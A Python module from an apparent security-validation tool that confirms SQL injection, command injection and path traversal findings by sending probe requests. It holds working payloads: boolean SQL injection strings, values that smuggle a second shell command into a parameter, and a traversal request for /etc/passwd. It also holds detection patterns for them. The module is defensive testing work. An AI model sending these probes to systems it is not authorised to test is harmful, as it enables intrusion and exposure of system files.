"""Deterministic injection reproduction recipes (SQL, Command, Path Traversal)."""

from __future__ import annotations

import urllib.parse

from ..http import HttpExchange, ScopedHttpClient
from .base import TestResult, ValidationHypothesis

SQL_ERROR_PATTERNS = [
    "syntax error",
    "operationalerror",
    "psycopg2",
    "mysql.connector",
    "ora-",
    "sql syntax",
    "quoted string not properly terminated",
    "unclosed quotation mark",
    "sqlite3.operationalerror",
    "pg_catalog",
    "fatal: syntax error",
]

PATH_TRAVERSAL_INDICATORS = [
    "root:x:",
    "root:*:",
    "[boot loader]",
    "/bin/sh",
    "/bin/bash",
]


def _build_url(base_url: str, param: str, value: str) -> str:
    parsed = urllib.parse.urlparse(base_url)
    qs = urllib.parse.parse_qs(parsed.query)
    qs[param] = [value]
    new_query = urllib.parse.urlencode(qs, doseq=True)
    return urllib.parse.urlunparse(
        (parsed.scheme, parsed.netloc, parsed.path, parsed.params, new_query, parsed.fragment)
    )


class SQLInjectionRecipe:
    """Deterministic reproduction recipe for SQL injection vulnerabilities."""

    def execute(self, hypothesis: ValidationHypothesis, client: ScopedHttpClient) -> TestResult:
        exchanges: list[HttpExchange] = []
        counterevidence: list[str] = []

        # 1. Baseline request
        base_url = _build_url(hypothesis.target_url, hypothesis.parameter, "normal123")
        ex0 = client.request("GET", base_url)
        exchanges.append(ex0)

        # 2. Syntax break probe
        probe_quote = _build_url(hypothesis.target_url, hypothesis.parameter, "normal123'")
        ex_quote = client.request("GET", probe_quote)
        exchanges.append(ex_quote)

        # Check for DB error patterns in quote probe response
        lower_body = ex_quote.response_body.lower()
        for err in SQL_ERROR_PATTERNS:
            if err in lower_body and err not in ex0.response_body.lower():
                return TestResult(
                    hypothesis_id=hypothesis.id,
                    rule_id=hypothesis.rule_id,
                    reproduced=True,
                    status="verified",
                    message=f"SQL injection verified: database error pattern '{err}' triggered on single-quote probe",
                    exchanges=exchanges,
                )

        # 3. Boolean true probe
        probe_true = _build_url(hypothesis.target_url, hypothesis.parameter, "normal123' OR '1'='1")
        ex_true = client.request("GET", probe_true)
        exchanges.append(ex_true)

        # 4. Boolean false probe
        probe_false = _build_url(
            hypothesis.target_url, hypothesis.parameter, "normal123' AND '1'='2"
        )
        ex_false = client.request("GET", probe_false)
        exchanges.append(ex_false)

        # Differential behavior: true matches normal, false differs
        if ex_true.status_code == 200 and ex_false.status_code != 200:
            return TestResult(
                hypothesis_id=hypothesis.id,
                rule_id=hypothesis.rule_id,
                reproduced=True,
                status="verified",
                message="SQL injection verified: boolean condition differential detected",
                exchanges=exchanges,
            )

        counterevidence.append("No database error or differential logic triggered by SQL probes")
        return TestResult(
            hypothesis_id=hypothesis.id,
            rule_id=hypothesis.rule_id,
            reproduced=False,
            status="refuted",
            message="SQL injection hypothesis not reproduced",
            exchanges=exchanges,
            counterevidence=counterevidence,
        )


class CommandInjectionRecipe:
    """Deterministic reproduction recipe for OS command injection."""

    def execute(self, hypothesis: ValidationHypothesis, client: ScopedHttpClient) -> TestResult:
        exchanges: list[HttpExchange] = []
        canary = "plex_canary_918273"

        # Safe canary echo probes
        probe_semi = _build_url(
            hypothesis.target_url, hypothesis.parameter, f"127.0.0.1; echo {canary}"
        )
        ex1 = client.request("GET", probe_semi)
        exchanges.append(ex1)

        if canary in ex1.response_body:
            return TestResult(
                hypothesis_id=hypothesis.id,
                rule_id=hypothesis.rule_id,
                reproduced=True,
                status="verified",
                message=f"Command injection verified: test canary '{canary}' reflected in response",
                exchanges=exchanges,
            )

        probe_pipe = _build_url(
            hypothesis.target_url, hypothesis.parameter, f"127.0.0.1 | echo {canary}"
        )
        ex2 = client.request("GET", probe_pipe)
        exchanges.append(ex2)

        if canary in ex2.response_body:
            return TestResult(
                hypothesis_id=hypothesis.id,
                rule_id=hypothesis.rule_id,
                reproduced=True,
                status="verified",
                message=f"Command injection verified: piped canary '{canary}' reflected in response",
                exchanges=exchanges,
            )

        return TestResult(
            hypothesis_id=hypothesis.id,
            rule_id=hypothesis.rule_id,
            reproduced=False,
            status="refuted",
            message="Command injection hypothesis not reproduced",
            exchanges=exchanges,
            counterevidence=["Canary was not executed or reflected in responses"],
        )


class PathTraversalRecipe:
    """Deterministic reproduction recipe for path traversal vulnerabilities."""

    def execute(self, hypothesis: ValidationHypothesis, client: ScopedHttpClient) -> TestResult:
        exchanges: list[HttpExchange] = []
        probe_traversal = _build_url(
            hypothesis.target_url, hypothesis.parameter, "../../../../etc/passwd"
        )
        ex = client.request("GET", probe_traversal)
        exchanges.append(ex)

        for indicator in PATH_TRAVERSAL_INDICATORS:
            if indicator in ex.response_body:
                return TestResult(
                    hypothesis_id=hypothesis.id,
                    rule_id=hypothesis.rule_id,
                    reproduced=True,
                    status="verified",
                    message=f"Path traversal verified: system file signature '{indicator}' detected",
                    exchanges=exchanges,
                )

        return TestResult(
            hypothesis_id=hypothesis.id,
            rule_id=hypothesis.rule_id,
            reproduced=False,
            status="refuted",
            message="Path traversal hypothesis not reproduced",
            exchanges=exchanges,
            counterevidence=["No file disclosure signatures detected in traversal probe"],
        )
